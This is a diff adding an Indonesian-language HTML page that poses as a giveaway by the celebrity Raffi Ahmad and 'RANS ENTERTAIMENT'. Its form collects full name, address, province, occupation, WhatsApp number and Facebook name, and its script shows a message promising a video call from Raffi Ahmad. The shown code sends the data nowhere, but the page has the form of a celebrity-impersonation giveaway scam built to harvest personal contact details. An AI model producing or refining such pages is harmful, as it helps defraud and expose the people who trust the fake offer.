@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Giveaway Raffi Ahmad</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #d4af37, #ffdf00); /* emas */
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      text-align: center;
+      padding: 30px 15px;
+      color: white;
+    }
+    header h1 {
+      font-size: 50px;
+      margin: 0;
+      text-shadow: 0 3px 6px rgba(0,0,0,.3);
+    }
+    header h2 {
+      margin: 10px 0 20px;
+      font-size: 28px;
+    }
+    header img {
+      width: 160px;
+      border-radius: 12px;
+      border: 4px solid #fff;
+      box-shadow: 0 4px 12px rgba(0,0,0,.4);
+    }
+    main {
+      max-width: 600px;
+      margin: -20px auto 40px;
+      padding: 20px;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 8px 24px rgba(0,0,0,.15);
+    }
+    label {
+      display: block;
+      margin: 10px 0 5px;
+      font-weight: bold;
+    }
+    input, textarea {
+      width: 95%; /* kotak lebih kecil */
+      padding: 8px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font: inherit;
+    }
+    textarea { resize: vertical; }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: #d4af37;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      margin-top: 15px;
+      cursor: pointer;
+    }
+    .btn:hover { background: #c9a132; }
+    #closing {
+      display: none;
+      margin-top: 25px;
+      padding: 20px;
+      background: #fff8dc;
+      border-radius: 10px;
+      font-size: 16px;
+      line-height: 1.5;
+      text-align: center;
+      border: 2px dashed #d4af37;
+    }
+    #closing b { color: #d4af37; }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>GIVEAWAY🎁</h1>
+    <h2>RANS ENTERTAIMENT</h2>
+    <!-- Ganti PUT_BASE64_FOTO_DI_SINI dengan kode base64 -->
+    
+  </header>
+
+  <main>
+    <form id="giveawayForm">
+      <label for="nama">Nama Lengkap</label>
+      <input id="nama" name="nama" required>
+
+      <label for="alamat">Alamat Lengkap</label>
+      <textarea id="alamat" name="alamat" required></textarea>
+
+      <label for="provinsi">Provinsi</label>
+      <input id="provinsi" name="provinsi" required>
+
+      <label for="pekerjaan">Pekerjaan</label>
+      <input id="pekerjaan" name="pekerjaan" required>
+
+      <label for="hp">No. HP (WhatsApp)</label>
+      <input id="hp" name="hp" type="tel" placeholder="08xxxxxxxxxx" required>
+
+      <label for="fb">Nama Facebook</label>
+      <input id="fb" name="fb" required>
+
+      <label for="sumber">Dapat info giveaway dari siapa?</label>
+      <input id="sumber" name="sumber" required>
+
+      <button class="btn" type="submit">🎁 Kirim Pendaftaran</button>
+    </form>
+
+    <!-- Pesan penutup -->
+    <div id="closing">
+      ✅ <b>Baik, terima kasih.</b><br>
+      Data akan diundi dulu ya. Mohon ditunggu, jika terpilih akan langsung dihubungi melalui 
+      <b>video call oleh Raffi Ahmad</b>. 🎉
+    </div>
+  </main>
+
+  <script>
+    const form = document.getElementById("giveawayForm");
+    const closing = document.getElementById("closing");
+
+    form.addEventListener("submit", function(e){
+      e.preventDefault();
+      form.style.display = "none";   // form hilang
+      closing.style.display = "block"; // pesan muncul
+    });
+  </script>
+</body>
+</html>
